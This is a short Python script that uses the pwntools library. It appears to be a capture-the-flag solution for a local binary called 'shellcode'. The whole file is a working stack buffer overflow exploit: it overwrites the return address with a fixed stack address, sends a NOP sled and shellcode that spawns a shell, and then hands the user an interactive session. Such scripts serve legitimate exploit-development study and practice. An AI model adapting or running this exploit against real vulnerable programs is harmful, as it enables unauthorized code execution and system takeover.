import pwn
import os

script_dir = os.path.dirname(os.path.realpath(__file__))
elf = pwn.context.binary = pwn.ELF(os.path.join(script_dir, "./shellcode"))


def exploit(io):
    return_address_ofs = 40
    shellcode = pwn.asm(pwn.shellcraft.sh())
    stack_address = 0x7FFFFFFFE5C0

    payload = b"A" * return_address_ofs
    payload += pwn.p64(stack_address)
    payload += b"\x90" * 256  # nop sled
    payload += shellcode

    io.sendline(payload)


def main():
    if pwn.args.GDB:
        io = pwn.gdb.debug(elf.path)
    else:
        io = pwn.process(elf.path)

    exploit(io)
    io.interactive()


if __name__ == "__main__":
    main()
